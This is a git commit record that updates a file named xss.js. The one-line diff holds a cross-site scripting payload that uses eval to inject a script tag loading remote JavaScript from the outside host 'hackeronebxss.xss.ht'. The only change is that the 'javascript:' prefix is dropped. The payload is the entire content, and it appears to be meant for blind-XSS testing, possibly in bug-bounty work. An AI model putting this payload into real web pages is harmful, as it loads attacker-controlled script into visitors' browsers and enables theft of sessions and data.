2d41da1d9b55bd8876793893721c6b8e2a6f69e6
Cillian <Cilliancollins2002@gmail.com>
2022-09-03 20:08:43 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,1 @@
-javascript:eval('var a=document.createElement(\'script\');a.src=\'https://hackeronebxss.xss.ht\';document.body.appendChild(a)')
+eval('var a=document.createElement(\'script\');a.src=\'https://hackeronebxss.xss.ht\';document.body.appendChild(a)')
